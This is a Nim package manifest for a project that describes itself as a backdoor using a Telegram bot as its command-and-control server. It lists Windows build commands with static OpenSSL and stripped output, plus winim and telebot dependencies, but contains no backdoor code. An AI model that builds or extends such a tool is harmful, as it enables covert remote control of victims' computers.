# Package

version       = "0.1.0"
author        = "Yaz"
description   = "a backdoor in Nim using Telegram bot as a C2 server"
license       = "GPL-3.0"
srcDir        = "src"
bin           = @["NimbleTeleBackdoor"]



# Dependencies
#nim c --cc:vcc --os:windows --cpu:amd64 -d:release -d:noOpenSSLHacks --dynlibOverride:ssl- --dynlibOverride:crypto- -d:sslVersion:"(" -d:ssl -p:. --clibdir:C:\vcpkg\installed\x64-windows-static\lib\ --cincludes:C:\vcpkg\installed\x64-windows-static\include\openssl --clibdir:c:\um_lib --clibdir:c:\ucrt_lib --cincludes:c:\ucrt_includes --cincludes:c:\um_includes --cincludes:c:\shared_includes --dynlibOverride:ssl --passl:/DYNAMICBASE  --passl:libcrypto.lib --passl:libssl.lib --passl:Crypt32.lib --passl:Ws2_32.lib --passl:Advapi32.lib --passl:User32.lib --passl:/link --passc:/MT test.nim
#nim c --opt:size --passL:-Os -d:danger -d:release -d:ssl -d:noOpenSSLHacks --dynlibOverride:ssl- --dynlibOverride:crypto- -d:sslVersion:"(" --passL:-Lsrc\ --passL:-Bstatic --passL:-lssl --passL:-lcrypto --threads:on --passL:-Bdynamic --passL:-s .\src\main.nim
requires "nim >= 1.0.0"
requires "winim >= 3.2.3"
requires "telebot >= 0.6.8"
